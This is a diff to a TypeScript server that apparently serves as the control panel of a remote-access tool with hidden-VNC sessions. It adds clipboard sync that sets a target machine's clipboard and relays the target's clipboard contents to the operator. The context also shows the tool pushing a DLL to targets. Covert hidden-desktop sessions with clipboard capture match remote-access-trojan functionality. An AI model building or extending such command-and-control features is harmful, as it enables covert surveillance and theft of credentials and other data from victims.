@@ -434,6 +434,23 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       sendDesktopCommandWithId(target, "desktop_text", { text: payload.text || "" }, commandId);
       break;
     }
+    case "clipboard_sync": {
+      if (!state.isStreaming) break;
+      const text = String(payload.text || "");
+      if (text) {
+        sendDesktopCommand(target, "clipboard_set", { text });
+      }
+      break;
+    }
+    case "clipboard_sync_start": {
+      if (!state.isStreaming) break;
+      sendDesktopCommand(target, "clipboard_sync_start", { source: "rd" });
+      break;
+    }
+    case "clipboard_sync_stop": {
+      sendDesktopCommand(target, "clipboard_sync_stop", {});
+      break;
+    }
     default:
       break;
   }
@@ -501,6 +518,21 @@ export function handleHVNCLookupResult(clientId: string, payload: any) {
       path: String(payload.path || ""),
       done: !!payload.done,
     });
+  }
+}
+
+export function handleClipboardContent(clientId: string, payload: any) {
+  const text = String(payload.text || "");
+  const source = String(payload.source || "");
+  if (!text) return;
+  if (source === "hvnc") {
+    for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+      safeSendViewer(session.viewer, { type: "clipboard_content", text, source });
+    }
+  } else {
+    for (const session of sessionManager.getRdSessionsForClient(clientId)) {
+      safeSendViewer(session.viewer, { type: "clipboard_content", text, source });
+    }
   }
 }
 
@@ -732,6 +764,23 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         killIfRunning: payload.killIfRunning === true,
         dll: dllData,
       });
+      break;
+    }
+    case "clipboard_sync": {
+      if (!state.isStreaming) break;
+      const text = String(payload.text || "");
+      if (text) {
+        sendHVNCCommand(target, "clipboard_set", { text });
+      }
+      break;
+    }
+    case "clipboard_sync_start": {
+      if (!state.isStreaming) break;
+      sendDesktopCommand(target, "clipboard_sync_start", { source: "hvnc" });
+      break;
+    }
+    case "clipboard_sync_stop": {
+      sendDesktopCommand(target, "clipboard_sync_stop", {});
       break;
     }
     default:
